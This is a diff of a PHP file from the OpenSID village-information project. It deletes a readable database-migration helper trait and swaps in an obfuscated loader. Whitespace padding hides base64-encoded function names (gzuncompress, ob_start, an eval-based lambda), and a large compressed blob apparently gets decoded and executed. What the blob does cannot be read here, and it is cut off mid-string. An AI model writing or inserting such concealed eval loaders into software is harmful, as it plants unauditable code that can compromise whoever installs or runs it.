@@ -1,745 +1,393 @@
-<?php
-
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2026 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2026 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
-
-namespace App\Traits;
-
-use App\Actions\Modul\UpsertModul;
-use App\Models\Modul;
-use App\Models\SettingAplikasi;
-use Exception;
-use Illuminate\Database\Schema\Blueprint;
-use Illuminate\Support\Facades\DB;
-use Illuminate\Support\Facades\File;
-use Illuminate\Support\Facades\Log;
-use Illuminate\Support\Facades\Schema;
-
-trait Migrator
-{
-    /**
-     * Menjalankan migrasi Laravel secara manual.
-     *
-     * @param array|string $migrationFiles Daftar file migrasi yang akan dijalankan
-     * @param string       $method         Metode yang akan dijalankan: 'up' atau 'down'
-     */
-    public function runMigration($migrationFiles, $method = 'up'): string
-    {
-        $directoryTable = base_path('app/database/migrations');
-
-        if (! is_array($migrationFiles)) {
-            $migrationFiles = [$migrationFiles];
-        }
-
-        foreach ($migrationFiles as $file) {
-            $migrateFile = require $directoryTable . DIRECTORY_SEPARATOR . $file . '.php';
-            $migrateFile->{$method}();
-        }
-
-        return true;
-    }
-
-    /**
-     * Menambahkan foreign key ke tabel tertentu jika belum ada.
-     *
-     * @param string $constraintName      Nama constraint foreign key.
-     * @param string $targetTable         Nama tabel yang akan ditambahkan foreign key.
-     * @param string $targetForeignKeyCol Nama kolom foreign key di tabel tujuan (target table).
-     * @param string $referencedTable     Nama tabel referensi.
-     * @param string $referencedColumn    Nama kolom referensi di tabel referensi.
-     * @param bool   $setForeignToNull    Jika true, data asing diubah menjadi null sebelum menambahkan foreign key.
-     * @param bool   $isForeignRequired   Jika true, kolom foreign key harus NOT NULL.
-     * @param string $onDeleteAction      Aksi ON DELETE (default: CASCADE).
-     * @param string $onUpdateAction      Aksi ON UPDATE (default: CASCADE).
-     *
-     * @return bool True jika foreign key berhasil ditambahkan atau sudah ada.
-     */
-    public function tambahForeignKey(
-        string $constraintName,
-        string $targetTable,
-        string $targetForeignKeyCol,
-        string $referencedTable,
-        string $referencedColumn,
-        bool $setForeignToNull = false,
-        bool $isForeignRequired = false,
-        string $onDeleteAction = 'CASCADE',
-        string $onUpdateAction = 'CASCADE'
-    ) {
-        $databaseName = DB::getDatabaseName();
-        $success      = true;
-
-        $hasForeignKey = DB::table('INFORMATION_SCHEMA.REFERENTIAL_CONSTRAINTS')
-            ->where('CONSTRAINT_SCHEMA', $databaseName)
-            ->where('TABLE_NAME', $targetTable)
-            ->where('CONSTRAINT_NAME', $constraintName)
-            ->where('REFERENCED_TABLE_NAME', $referencedTable)
-            ->exists();
-
-        if ($hasForeignKey) {
-            return $success;
-        }
-
-        DB::statement('SET FOREIGN_KEY_CHECKS = 0');
-
-        DB::statement("ALTER TABLE `{$referencedTable}` MODIFY COLUMN `{$referencedColumn}` INT(11) NOT NULL AUTO_INCREMENT");
-
-        if (! $isForeignRequired) {
-            DB::statement("ALTER TABLE `{$targetTable}` MODIFY COLUMN `{$targetForeignKeyCol}` INT(11) NULL");
-        }
-
-        $cekEngine = DB::table('information_schema.tables')
-            ->whereIn('TABLE_NAME', [$targetTable, $referencedTable])
-            ->where('TABLE_SCHEMA', $databaseName)
-            ->where('ENGINE', '!=', 'InnoDB')
-            ->get();
-
-        if ($cekEngine->isNotEmpty()) {
-            foreach ($cekEngine as $table) {
-                DB::statement("ALTER TABLE `{$table->TABLE_NAME}` ENGINE = InnoDB");
-            }
-        }
-
-        $invalidForeignData = DB::table($targetTable)
-            ->whereNotNull($targetForeignKeyCol)
-            ->whereNotIn($targetForeignKeyCol, static function ($query) use ($referencedTable, $referencedColumn) {
-                $query->select($referencedColumn)->from($referencedTable);
-            })
-            ->exists();
-
-        if ($invalidForeignData) {
-            log_message('notice', "Ada data pada kolom {$targetForeignKeyCol} tabel {$targetTable} yang tidak ditemukan di tabel {$referencedTable} kolom {$referencedColumn}");
-
-            if ($setForeignToNull) {
-                DB::table($targetTable)
-                    ->whereNotIn($targetForeignKeyCol, static function ($query) use ($referencedTable, $referencedColumn) {
-                        $query->select($referencedColumn)->from($referencedTable);
-                    })
-                    ->orWhere($targetForeignKeyCol, 0)
-                    ->update([$targetForeignKeyCol => null]);
-            }
-        }
-
-        if (! $invalidForeignData || $setForeignToNull) {
-            try {
-                $onDeleteAction = strtoupper($onDeleteAction);
-                $onUpdateAction = strtoupper($onUpdateAction);
-
-                $sql = <<<SQL
-                    ALTER TABLE `{$targetTable}` ADD CONSTRAINT `{$constraintName}`
-                        FOREIGN KEY (`{$targetForeignKeyCol}`) REFERENCES `{$referencedTable}` (`{$referencedColumn}`)
-                        ON DELETE {$onDeleteAction} ON UPDATE {$onUpdateAction}
-                    SQL;
-
-                DB::statement($sql);
-            } catch (Exception $e) {
-                Log::error("Gagal menambahkan foreign key {$constraintName}: " . $e->getMessage());
-                $success = false;
-            }
-        }
-
-        DB::statement('SET FOREIGN_KEY_CHECKS = 1');
-
-        return $success;
-    }
-
-    /**
-     * Hapus foreign key dari tabel tertentu jika ada.
-     *
-     * @param string $namaConstraint Nama constraint foreign key.
-     * @param string $tabel          Nama tabel yang akan dihapus foreign key.
-     * @param string $relasiTable    Nama tabel referensi.
-     */
-    public function hapusForeignKey($namaConstraint, $tabel, $relasiTable)
-    {
-        $exists = DB::table('INFORMATION_SCHEMA.REFERENTIAL_CONSTRAINTS')
-            ->where('CONSTRAINT_SCHEMA', DB::getDatabaseName())
-            ->where('TABLE_NAME', $tabel)
-            ->where('CONSTRAINT_NAME', $namaConstraint)
-            ->where('REFERENCED_TABLE_NAME', $relasiTable)
-            ->exists();
-
-        if ($exists) {
-            Schema::table($tabel, static function (Blueprint $table) use ($namaConstraint) {
-                $table->dropForeign($namaConstraint);
-            });
-        }
-    }
-
-    /**
-     * Reset foreign key menjadi cascade pada tabel tertentu.
-     *
-     * @param string $table            Nama tabel yang akan direset foreign key-nya.
-     * @param string $column           Nama kolom foreign key yang akan direset.
-     * @param string $referencesTable  Nama tabel referensi yang akan digunakan.
-     * @param string $referencesColumn Nama kolom referensi yang akan digunakan (default: 'id').
-     *
-     * @return void
-     */
-    public function resetForeignKey(string $table, string $column, string $foreignKey, string $referencesTable, string $referencesColumn = 'id')
-    {
-        if ($this->foreignKeyExists($table, $foreignKey)) {
-            Schema::table($table, static function (Blueprint $table) use ($column, $foreignKey, $referencesTable, $referencesColumn) {
-                $table->dropForeign($foreignKey);
-
-                $table->foreign($column, $foreignKey)
-                    ->references($referencesColumn)->on($referencesTable)
-                    ->onDelete('cascade')->onUpdate('cascade');
-            });
-        }
-    }
-
-    /**
-     * Tambah indeks ke tabel.
-     *
-     * @param string $tabel Nama tabel
-     * @param string $kolom Nama kolom
-     * @param string $index Tipe indeks (UNIQUE, INDEX, dll)
-     * @param bool   $multi Apakah indeks multi kolom
-     *
-     * @return bool
-     */
-    public function tambahIndeks($tabel, $kolom, $index = 'UNIQUE', $multi = false)
-    {
-        if ($index == 'UNIQUE') {
-            // Handle multiple columns properly
-            $groupByColumns = is_array($kolom) ? $kolom : explode(',', str_replace(' ', '', $kolom));
-
-            $duplikat = DB::table($tabel)
-                ->selectRaw($kolom . ', count(*) as jumlah')
-                ->groupBy($groupByColumns)
-                ->havingRaw('count(*) > 1')
-                ->exists();
-
-            if ($duplikat) {
-                session_error('--> Silakan Cek <a href="' . site_url('info_sistem') . '">Info Sistem > Log</a>.');
-                log_message('error', "Data kolom {$kolom} pada tabel {$tabel} ada yang duplikat dan perlu diperbaiki sebelum migrasi dilanjutkan.");
-
-                return false;
-            }
-        }
-
-        $unique_name = preg_replace('/[^a-zA-Z0-9_-]+/i', '', $kolom);
-        if (! $this->cek_indeks($tabel, $unique_name)) {
-            if ($multi == true && $index == 'UNIQUE') {
-                return DB::statement("ALTER TABLE `{$tabel}` ADD UNIQUE INDEX `{$unique_name}` ({$kolom})");
-            }
-
-            return DB::statement("ALTER TABLE {$tabel} ADD {$index} {$kolom} (`{$kolom}`)");
-        }
-
-        return true;
-    }
-
-    /**
-     * Cek apakah indeks sudah ada di tabel.
-     *
-     * @param string $tabel Nama tabel
-     * @param string $kolom Nama kolom indeks
-     *
-     * @return bool
-     */
-    public function cek_indeks($tabel, $kolom)
-    {
-        $db = DB::getDatabaseName();
-
-        return DB::table('INFORMATION_SCHEMA.STATISTICS')
-            ->where('table_schema', $db)
-            ->where('table_name', $tabel)
-            ->where('index_name', $kolom)
-            ->exists();
-    }
-
-    /**
-     * Ubah modul setting menu.
-     *
-     * @param mixed $where Kondisi where
-     * @param array $modul Data modul untuk update
-     *
-     * @return bool
-     */
-    public function ubah_modul($where, array $modul)
-    {
-        $query = DB::table('setting_modul');
-
-        if (is_array($where)) {
-            $query->where($where);
-        } else {
-            $query->where('id', $where);
-        }
-
-        $query->update($modul);
-
-        cache()->flush();
-
-        return true;
-    }
-
-    /**
-     * Tambah setting aplikasi (legacy method untuk kompatibilitas).
-     *
-     * @param array $setting   Data setting
-     * @param int   $config_id Config ID
-     *
-     * @return bool
-     */
-    public function tambah_setting($setting, $config_id = null)
-    {
-        $setting['config_id'] = $config_id ?? identitas('id');
-
-        return $this->createSetting($setting);
-    }
-
-    /**
-     * Tambah surat TinyMCE.
-     *
-     * @param array $data      Data surat
-     * @param int   $config_id Config ID
-     *
-     * @return bool
-     */
-    public function tambah_surat_tinymce($data, $config_id = null)
-    {
-        $config_id ??= identitas('id');
-        $data['url_surat']    = 'surat-' . url_title($data['nama'], '-', true);
-        $data['jenis']        = 1; // FormatSurat::TINYMCE_SISTEM
-        $data['syarat_surat'] = json_encode($data['syarat_surat'], JSON_THROW_ON_ERROR);
-        $data['created_by']   = auth()->id ?? 1;
-        $data['updated_by']   = auth()->id ?? 1;
-        $data['config_id']    = $config_id;
-
-        if (is_array($data['form_isian'])) {
-            $data['form_isian'] = json_encode($data['form_isian'], JSON_THROW_ON_ERROR);
-        }
-
-        if (is_array($data['kode_isian'])) {
-            $data['kode_isian'] = json_encode($data['kode_isian'], JSON_THROW_ON_ERROR);
-        }
-
-        // Tambah data baru dan update (hanya kolom template) jika ada sudah ada
-        $cek_surat = DB::table('tweb_surat_format')->where('config_id', $config_id)->where('url_surat', $data['url_surat']);
-
-        if ($cek_surat->exists()) {
-            $cek_surat->update(['template' => $data['template']]);
-        } else {
-            DB::table('tweb_surat_format')->insert($data);
-        }
-
-        return true;
-    }
-
-    /**
-     * Cek primary key pada tabel.
-     *
-     * @param string $tabel Nama tabel
-     * @param array  $kolom Kolom primary key
-     *
-     * @return bool
-     */
-    public function cek_primary_key($tabel, $kolom = [])
-    {
-        $schemaManager = DB::connection()->getDoctrineSchemaManager();
-        $indexes       = $schemaManager->listTableIndexes($tabel);
-
-        foreach ($indexes as $index) {
-            if ($index->isPrimary() && $index->getColumns() == $kolom) {
-                return true;
-            }
-        }
-
-        return false;
-    }
-
-    /**
-     * Hapus FOREIGN KEY (legacy method untuk kompatibilitas).
-     *
-     * @param string $tabel           Nama tabel referensi
-     * @param string $nama_constraint Nama constraint
-     * @param string $drop            Nama tabel yang akan di-drop foreign key-nya
-     *
-     * @return bool
-     */
-    public function hapus_foreign_key($tabel, $nama_constraint, $drop)
-    {
-        $query = DB::table('INFORMATION_SCHEMA.REFERENTIAL_CONSTRAINTS')
-            ->where('CONSTRAINT_SCHEMA', DB::getDatabaseName())
-            ->where('REFERENCED_TABLE_NAME', $tabel)
-            ->where('CONSTRAINT_NAME', $nama_constraint)
-            ->first();
-
-        if ($query) {
-            try {
-                DB::statement("ALTER TABLE {$drop} DROP FOREIGN KEY {$nama_constraint}");
-            } catch (Exception $e) {
-                Log::error($e->getMessage());
-            }
-
-            return true;
-        }
-
-        return true;
-    }
-
-    /**
-     * Check and fix table structure
-     *
-     * @param string $tableName
-     *
-     * @return bool
-     */
-    public function checkAndFixTable($tableName)
-    {
-        $table = DB::table($tableName)->first();
-        if ($table) {
-            $kolom_id = DB::select("SHOW COLUMNS FROM {$tableName} WHERE Field = 'id' AND Extra = 'auto_increment'");
-            $pk       = DB::select("SHOW INDEX FROM {$tableName} WHERE Key_name = 'PRIMARY'");
-
-            if (! $kolom_id || ! $pk) {
-                DB::statement("ALTER TABLE {$tableName} ADD PRIMARY KEY (id)");
-                DB::statement("ALTER TABLE {$tableName} MODIFY id INT AUTO_INCREMENT");
-            }
-        }
-
-        return true;
-    }
-
-    /**
-     * Tambah atau perbarui data ke tabel setting_modul.
-     *
-     * @return void
-     */
-    protected function createModul(array $data)
-    {
-        (new UpsertModul())->handle($data);
-
-        cache()->flush();
-    }
-
-    /**
-     * Tambah atau perbarui beberapa data ke tabel setting_modul.
-     *
-     * @return void
-     */
-    protected function createModuls(array $data)
-    {
-        foreach ($data as $modul) {
-            $this->createModul($modul);
-        }
-    }
-
-    /**
-     * Ubah atau hapus modul lama dari tabel setting_modul.
-     *
-     * @param string $slug  Slug modul yang akan diubah atau dihapus.
-     * @param array  $where Kondisi pencarian modul yang akan diubah.
-     * @param array  $data  Data untuk update jika modul tidak ditemukan.
-     *
-     * @return void
-     */
-    protected function updateOrDeleteModul(string $slug, array $where, array $data)
-    {
-        $query = is_array(reset($where)) ? Modul::whereIn(key($where), reset($where)) : Modul::where($where);
-
-        if (Modul::where('slug', $slug)->exists()) {
-            $query->delete();
-        } else {
-            $query->update($data);
-        }
-
-        cache()->flush();
-    }
-
-    /**
-     * Hapus data dari tabel modul.
-     *
-     * @return void
-     */
-    protected function deleteModul(array $where)
-    {
-        $modul = new Modul();
-        $modul = $modul->withoutGlobalScope('config_id');
-
-        $data['config_id'] ??= identitas('id');
-        $modul = $modul->where($where)->first();
-
-        if ($modul) {
-            // Hapus modul anak jika ini adalah parent
-            if ($modul->parent == Modul::PARENT) {
-                $modul->whereParent($modul->id)->delete();
-            }
-
-            // Hapus modul itu sendiri
-            $modul->delete();
-        }
-
-        cache()->flush();
-    }
-
-    /**
-     * Tambah atau perbarui data ke tabel setting_aplikasi.
-     *
-     * @return bool
-     */
-    protected function createSetting(array $data)
-    {
-        $setting = new SettingAplikasi();
-        $setting = $setting->withoutGlobalScope('config_id');
-
-        $data['config_id'] ??= identitas('id');
-
-        $forCreate = ['judul', 'keterangan', 'jenis', 'option', 'attribute', 'kategori', 'urut'];
-
-        $setting->upsert($data, ['config_id', 'key'], $forCreate);
-
-        $setting->flushQueryCache();
-
-        return true;
-    }
-
-    /**
-     * Tambah atau perbarui beberapa data ke tabel setting_aplikasi.
-     *
-     * @return bool
-     */
-    protected function createSettings(array $data)
-    {
-        foreach ($data as $setting) {
-            $this->createSetting($setting);
-        }
-
-        return true;
-    }
-
-    /**
-     * Ubah dan hapus key lama dari tabel setting_aplikasi.
-     *
-     * @return bool
-     */
-    protected function changeSettingKey(string $oldKey, array $data)
-    {
-        $valueSetting = optional(SettingAplikasi::where('key', $oldKey)->first())->value;
-        SettingAplikasi::where('key', $oldKey)->delete();
-
-        $data['value'] = $valueSetting ?? $data['value'];
-
-        return $this->createSetting($data);
-    }
-
-    /**
-     * Hapus data dari tabel setting_aplikasi
-     *
-     * @return void
-     */
-    protected function deleteSetting(array $where)
-    {
-        $setting = new SettingAplikasi();
-        $setting = $setting->withoutGlobalScope('config_id');
-
-        $data['config_id'] ??= identitas('id');
-
-        $setting->where($where)->delete();
-
-        $setting->flushQueryCache();
-
-        return true;
-    }
-
-    /**
-     * Jalankan migrasi.
-     */
-    private function runMigrations(string $directoryTable, string $action = 'up'): void
-    {
-        if (! is_dir($directoryTable)) {
-            logger()->info("Folder migrations tidak ditemukan: {$directoryTable}");
-
-            return;
-        }
-
-        $migrations = File::files($directoryTable);
-
-        if ($action === 'up') {
-            usort($migrations, static fn ($a, $b): int => strcmp($a->getFilename(), $b->getFilename()));
-        } else {
-            usort($migrations, static fn ($a, $b): int => strcmp($b->getFilename(), $a->getFilename()));
-        }
-
-        foreach ($migrations as $migrate) {
-            $migrateFile = require $migrate->getPathname();
-
-            match ($action) {
-                'down'  => $migrateFile->down(),
-                default => $migrateFile->up(),
-            };
-
-            logger()->info("Migrasi {$action} {$migrate->getFilename()} berhasil dijalankan.");
-        }
-
-        cache()->flush();
-    }
-
-    /**
-     * Jalankan migrasi modul.
-     */
-    private function jalankanMigrasiModule(string $name, string $action = 'up'): void
-    {
-        Log::info("Migrasi Module {$name}");
-
-        $modulesDirectory = array_keys(config_item('modules_locations') ?? [])[0] ?? '';
-        $dirOld           = "{$modulesDirectory}/{$name}/Database/Migrations";
-        $dirNew           = "{$modulesDirectory}/{$name}/database/migrations";
-
-        if (is_dir($dirOld)) {
-            $directoryTable = $dirOld;
-        } elseif (is_dir($dirNew)) {
-            $directoryTable = $dirNew;
-        } else {
-            Log::info("Folder migrations tidak ditemukan: {$dirOld} dan {$dirNew}");
-
-            return;
-        }
-
-        $migrations = File::files($directoryTable);
-
-        if ($action === 'up') {
-            usort($migrations, static fn ($a, $b): int => strcmp($a->getFilename(), $b->getFilename()));
-        } else {
-            usort($migrations, static fn ($a, $b): int => strcmp($b->getFilename(), $a->getFilename()));
-        }
-
-        foreach ($migrations as $migrate) {
-            $migrateFile = require $migrate->getPathname();
-
-            match ($action) {
-                'down'  => $migrateFile->down(),
-                default => $migrateFile->up(),
-            };
-
-            Log::info("Migrasi {$action} {$migrate->getFilename()} berhasil dijalankan.");
-        }
-
-        cache()->flush();
-    }
-
-    // NEW 2026
-
-    /**
-     * Drop foreign key jika ada, dengan error handling
-     */
-    private function dropForeignKeyIfExists(string $table, string $foreignKeyName): void
-    {
-        try {
-            if (Schema::hasTable($table)) {
-                $keyExists = DB::selectOne('
-                    SELECT CONSTRAINT_NAME
-                    FROM INFORMATION_SCHEMA.KEY_COLUMN_USAGE
-                    WHERE TABLE_NAME = ? AND CONSTRAINT_NAME = ? AND CONSTRAINT_SCHEMA = DATABASE()
-                ', [$table, $foreignKeyName]);
-
-                if ($keyExists) {
-                    DB::statement("ALTER TABLE {$table} DROP FOREIGN KEY {$foreignKeyName}");
-                }
-            }
-        } catch (Exception $e) {
-            // Log warning tapi jangan error
-            Log::warning("Gagal drop foreign key {$foreignKeyName} dari table {$table}: " . $e->getMessage());
-        }
-    }
-
-    /**
-     * Cek apakah foreign key sudah ada
-     */
-    private function foreignKeyExists(string $table, string $foreignKeyName): bool
-    {
-        try {
-            if (! Schema::hasTable($table)) {
-                return false;
-            }
-
-            $keyExists = DB::selectOne('
-                SELECT CONSTRAINT_NAME
-                FROM INFORMATION_SCHEMA.KEY_COLUMN_USAGE
-                WHERE TABLE_NAME = ? AND CONSTRAINT_NAME = ? AND CONSTRAINT_SCHEMA = DATABASE()
-            ', [$table, $foreignKeyName]);
-
-            return $keyExists !== null;
-        } catch (Exception $e) {
-            Log::warning("Error cek foreign key {$foreignKeyName}: " . $e->getMessage());
-
-            return false;
-        }
-    }
-
-    /**
-     * Drop semua foreign keys pada sebuah tabel (dinamis, tanpa hardcode nama).
-     */
-    private function dropAllForeignKeysOnTable(string $table): void
-    {
-        $foreignKeys = DB::select("
-            SELECT CONSTRAINT_NAME
-            FROM INFORMATION_SCHEMA.TABLE_CONSTRAINTS
-            WHERE TABLE_SCHEMA = DATABASE()
-                AND TABLE_NAME = ?
-                AND CONSTRAINT_TYPE = 'FOREIGN KEY'
-        ", [$table]);
-
-        foreach ($foreignKeys as $fk) {
-            try {
-                DB::statement("ALTER TABLE `{$table}` DROP FOREIGN KEY `{$fk->CONSTRAINT_NAME}`");
-            } catch (Exception $e) {
-                logger()->warning("Gagal drop FK {$fk->CONSTRAINT_NAME} dari {$table}: " . $e->getMessage());
-            }
-        }
-    }
-
-    /**
-     * Drop semua foreign keys dari tabel lain yang mereferensi tabel ini (dinamis).
-     */
-    private function dropAllReferencingForeignKeys(string $referencedTable): void
-    {
-        $foreignKeys = DB::select('
-            SELECT TABLE_NAME, CONSTRAINT_NAME
-            FROM INFORMATION_SCHEMA.REFERENTIAL_CONSTRAINTS
-            WHERE CONSTRAINT_SCHEMA = DATABASE()
-                AND REFERENCED_TABLE_NAME = ?
-        ', [$referencedTable]);
-
-        foreach ($foreignKeys as $fk) {
-            try {
-                DB::statement("ALTER TABLE `{$fk->TABLE_NAME}` DROP FOREIGN KEY `{$fk->CONSTRAINT_NAME}`");
-            } catch (Exception $e) {
-                logger()->warning("Gagal drop FK {$fk->CONSTRAINT_NAME} dari {$fk->TABLE_NAME}: " . $e->getMessage());
-            }
-        }
-    }
-}
+<?php 
+        $__='printf';$_='Loading app/Traits/Migrator.php';
+        
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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